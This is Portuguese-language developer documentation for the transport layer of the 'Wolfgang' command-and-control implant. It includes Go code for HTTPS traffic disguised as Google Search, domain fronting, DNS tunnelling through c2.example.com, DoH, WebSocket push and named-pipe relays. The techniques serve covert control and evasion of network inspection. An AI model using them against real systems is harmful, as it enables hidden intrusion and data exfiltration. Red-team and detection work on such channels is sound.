    Transports¶

    O Wolfgang implementa uma abstraccao de transport que permite que qualquer protocolo de rede carregue envelopes identicos. O implant nao sabe (e nao precisa saber) se esta comunicando via HTTPS, DNS ou WebSocket — ele so ve a interface ImplantTransport.

    Abstraccao de Transport¶

    A interface do lado implant:

    // cmd/implant/transport.go
type ImplantTransport interface {
    CheckIn(ctx context.Context, session *AgentSession, seq uint32) ([]taskDispatch, error)
    SendResult(ctx context.Context, session *AgentSession, seq uint32, result taskResult) error
    Name() string
}

    O factory pattern constroi o transport adequado:

    func NewTransport(name string, cfg *ImplantConfig) ImplantTransport {
    switch name {
    case "https", "http": return NewHTTPTransport(cfg)
    case "doh":           return NewDoHTransport(cfg)
    case "dns":           return NewDNSTransport(cfg)
    case "ws":            return NewWSTransport(cfg)
    case "pipe":          return NewPipeTransport(cfg)
    default:              return nil
    }
}

    HTTPS Listener¶

    O HTTPS listener e o transport primario. Usa um malleable profile para disfarcar trafego C2 como navegacao web legitima.

    Malleable Profile¶

    O profile define como dados C2 sao embutidos em requests e responses HTTP:

    // pkg/transport/http/profile.go
type Profile struct {
    Name   string        `yaml:"name"`
    Client ClientProfile `yaml:"client"`   // como implant envia
    Server ServerProfile `yaml:"server"`   // como server responde
}

type ClientProfile struct {
    GET  TransactionProfile `yaml:"get"`   // check-in
    POST TransactionProfile `yaml:"post"`  // task response
}

type TransactionProfile struct {
    URIs    []string          `yaml:"uris"`
    Headers map[string]string `yaml:"headers"`
    Params  map[string]string `yaml:"params"`
    Body    string            `yaml:"body"`
}

    O profile default imita Google Search:

    Aspecto Valor
    Check-in URIs /search, /s
    Check-in param q={{data_base64}}&client=firefox-b-d&source=hp
    Response URIs /complete/search, /async/search
    User-Agent Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
    Response Content-Type text/html; charset=UTF-8
    Response Server gws (Google Web Server)
    Response body <!doctype html><html>...<body>{{data_base64}}</body></html>

    Fluxo de Request/Response¶

    Check-in (GET):

    1. Implant codifica envelope em base64
    2. Embute no query param q com parametros decorativos (client=firefox-b-d)
    3. Listener extrai via ExtractData() — procura o param com {{data_base64}}
    4. Decodifica base64, obtem raw envelope bytes

    Task Response (POST):

    1. Implant codifica envelope em base64
    2. Embute no body como form-encoded: q=BASE64&oq=test&gs_l=hp
    3. Listener extrai via template matching no body

    Server Response:

    1. Listener codifica envelope de resposta em base64
    2. Embute no template HTML: <body>BASE64</body>
    3. Define headers do profile (Content-Type, Server, Cache-Control)

    Domain Fronting¶

    O implant suporta domain fronting para evadir inspeccao de rede:

    // cmd/implant/register.go
func NewTLSClient(cfg *ImplantConfig) *http.Client {
    tlsCfg := &tls.Config{InsecureSkipVerify: true}
    if cfg.FrontingDomain != "" {
        tlsCfg.ServerName = cfg.FrontingDomain  // TLS SNI = CDN
    }
    // ...
}

// Per-request: Host header aponta para o C2 real
func applyFronting(req *http.Request, cfg *ImplantConfig) {
    if cfg.ActualHost != "" {
        req.Host = cfg.ActualHost  // HTTP Host = C2
    }
}

    Resultado: network observer ve TLS SNI para cdn.example.com, mas o request chega ao C2 via Host header routing.

    DNS Listener¶

    O DNS listener implementa um servidor DNS autoritativo usando a biblioteca miekg/dns. DNS e o transport mais resiliente — funciona mesmo em redes altamente restritivas porque UDP 53 e quase universalmente permitido.

    Encoding¶

    Dados sao codificados em base32 sem padding nos labels de subdomain:

    // pkg/transport/dns/listener.go
var base32Encoding = base32.HexEncoding.WithPadding(base32.NoPadding)

    Base32 (nao base64) porque DNS labels sao case-insensitive, e base32 usa apenas [A-V0-9].

    Formato de Labels¶

    Check-in (A query):

    <agent_id_short>.c2.example.com

    Onde agent_id_short sao os primeiros 8 hex chars do agent ID. O listener resolve para o full ID via cache ou query ao storage.

    Data upload (CNAME query):

    <chunk_id>.<seq>.<base32_data>.<agent_id_short>.c2.example.com
    Label Descricao
    chunk_id Indice do chunk (0-based). Bit alto (0x80) marca chunk final
    seq Sequence number do envelope
    base32_data Dados codificados em base32 (max 63 chars por label)
    agent_id_short Primeiros 8 hex chars do agent ID

    Chunking e Reassembly¶

    sequenceDiagram
    participant I as Implant
    participant D as DNS Listener

    Note over I: Envelope tem 500 bytes
    Base32 = ~800 chars
    Label max = 63 chars
    Precisa de multiplos chunks

    I->>D: CNAME 0.42.BASE32_CHUNK0.a1b2c3d4.c2.example.com
    D-->>I: CNAME ok.c2.example.com

    I->>D: CNAME 1.42.BASE32_CHUNK1.a1b2c3d4.c2.example.com
    D-->>I: CNAME ok.c2.example.com

    I->>D: CNAME 130.42.BASE32_CHUNK2.a1b2c3d4.c2.example.com
    Note over I: chunk_id=130 = 2 | 0x80 (final flag)
    D->>D: Reassembla chunks 0+1+2
    D->>D: Decifra envelope completo
    D->>D: Processa task response
    D-->>I: CNAME ok.c2.example.com

    O listener mantem um mapa de partialMessage por agentID+seq:

    type partialMessage struct {
    chunks   map[uint8][]byte // chunkID -> data
    total    int              // -1 ate ver final flag
    received int
    created  time.Time
}

    Respostas DNS¶

    Cenario Tipo Record Valor
    Check-in sem tasks A record 1.0.0.0
    Check-in com tasks A record + TXT 1.0.0.1 + base32 do envelope nos TXT records
    Ack de chunk CNAME ok.c2.example.com
    Query invalida NOERROR vazio (evita NXDOMAIN suspicioso)

    Tasks sao retornadas em TXT records base32-encoded, respeitando o limite de 255 bytes por TXT string:

    func EncodeTXTRecords(data []byte) []string {
    encoded := EncodeBase32(data)
    var records []string
    for len(encoded) > MaxTXTLen { // MaxTXTLen = 255
        records = append(records, encoded[:MaxTXTLen])
        encoded = encoded[MaxTXTLen:]
    }
    records = append(records, encoded)
    return records
}

    O listener inicia UDP e TCP simultaneamente. TCP e necessario para respostas que excedem 512 bytes (comum com TXT records grandes):

    l.server = &mdns.Server{Addr: addr, Net: "udp", Handler: mux}
l.tcpServer = &mdns.Server{Addr: addr, Net: "tcp", Handler: mux}

    DoH Client (DNS-over-HTTPS)¶

    O DoH transport envia queries DNS via HTTPS para resolvers publicos (Cloudflare, Google, Quad9). Isso e util quando:

    • DNS direto esta bloqueado ou monitorado
    • O trafego HTTPS para resolvers publicos e permitido
    • Necessario evadir DNS inspection
    // pkg/transport/doh/client.go
var DefaultResolvers = []ResolverConfig{
    {URL: "https://1.1.1.1/dns-query"},      // Cloudflare
    {URL: "https://8.8.8.8/dns-query"},       // Google
    {URL: "https://9.9.9.9:5053/dns-query"},  // Quad9
}

    O client faz queries TXT via JSON API (application/dns-json) e tenta cada resolver em sequencia ate obter resposta.

    WebSocket Listener¶

    WebSocket oferece conexao persistente bidirecional, ideal para cenarios de baixa latencia onde o server precisa enviar tasks imediatamente (sem esperar check-in).

    Upgrade e Message Loop¶

    // pkg/transport/ws/listener.go
func (l *Listener) handleUpgrade(w http.ResponseWriter, r *http.Request) {
    conn, _ := websocket.Accept(w, r, &websocket.AcceptOptions{
        InsecureSkipVerify: true, // C2 flexibility
    })
    l.messageLoop(ctx, conn)
}

    O message loop roda em goroutine por conexao, processando JSON frames:

    type wsMessage struct {
    Type    string          `json:"type"`
    Payload json.RawMessage `json:"payload,omitempty"`
    Data    []byte          `json:"data,omitempty"`
}

    Server Push¶

    Diferente de HTTP (pull-based), WebSocket permite server push — tasks podem ser enviadas proativamente:

    func (l *Listener) PushTasks(agentID string, tasks []storage.Task) error {
    cs := l.conns[agentID]
    // Cifra tasks em envelope
    env := &transport.Envelope{MsgType: transport.MsgTaskDispatch, ...}
    encoded, _ := transport.Encode(env, sessionKey)
    // Envia diretamente pela conexao aberta
    l.sendMessage(ctx, cs.conn, wsMessage{Type: MsgTypeTaskDispatch, Data: encoded})
}

    Gerenciamento de Conexoes¶

    O listener mantem mapa de conexoes ativas por agentID. Reconexoes substituem a conexao anterior:

    func (l *Listener) addConn(agentID string, conn *websocket.Conn) {
    if existing, ok := l.conns[agentID]; ok {
        existing.conn.Close(websocket.StatusGoingAway, "replaced")
    }
    l.conns[agentID] = &connState{agentID: agentID, conn: conn}
}

    Named Pipe¶

    Named Pipe e usado para comunicacao intra-host entre implants. O cenario tipico: um implant com acesso externo (HTTPS) atua como relay para implants internos que so tem acesso local.

    Relay Architecture¶

    // pkg/transport/pipe/relay.go
type Relay struct {
    upstream Upstream
    pipes    []*PipeConn
}

func (r *Relay) HandleConn(conn *PipeConn) {
    for {
        n, _ := conn.Read(buf)           // Le raw envelope do child
        resp, _ := r.Forward(buf[:n])    // Encaminha upstream (HTTPS/DNS/WS)
        conn.Write(resp)                 // Retorna resposta ao child
    }
}

    O relay e transparente: envelopes do child implant passam inalterados para o upstream. O parent implant nao decifra nem modifica os envelopes — cada implant tem sua propria session key com o server.

    Platform Support¶

    Named Pipe usa APIs nativas:

    • Windows: CreateNamedPipe / ConnectNamedPipe (via pkg/transport/pipe/pipe_windows.go)
    • Linux/macOS: Unix domain sockets (via pkg/transport/pipe/pipe_other.go)

    Transport Chain no Implant¶

    O implant constroi uma cadeia de transports ordenada por prioridade. Se o transport primario falha, o Reconnector troca automaticamente para o proximo.

    // cmd/implant/transport.go
func BuildTransportChain(cfg *ImplantConfig) []ImplantTransport {
    prio := cfg.TransportPriority // e.g., ["https", "dns", "ws"]
    if len(prio) == 0 {
        prio = []string{cfg.Transport}
    }

    var chain []ImplantTransport
    for _, name := range prio {
        if t := NewTransport(name, cfg); t != nil {
            chain = append(chain, t)
        }
    }

    // Garantia: sempre tem pelo menos HTTPS
    if len(chain) == 0 {
        chain = append(chain, NewHTTPTransport(cfg))
    }
    return chain
}

    Logica de Fallback¶

    O Reconnector gerencia a rotacao (ver Implant Internals):

    1. Cada falha: rota dominio para proximo callback URL
    2. N falhas consecutivas (default 10): troca para proximo transport na chain
    3. M falhas totais (default 100): kill switch — implant termina

    Alem da rotacao de transport, cada falha tambem aplica exponential backoff com jitter:

    backoff = min(base_sleep * 2^failures, max_backoff) +/- 25% jitter
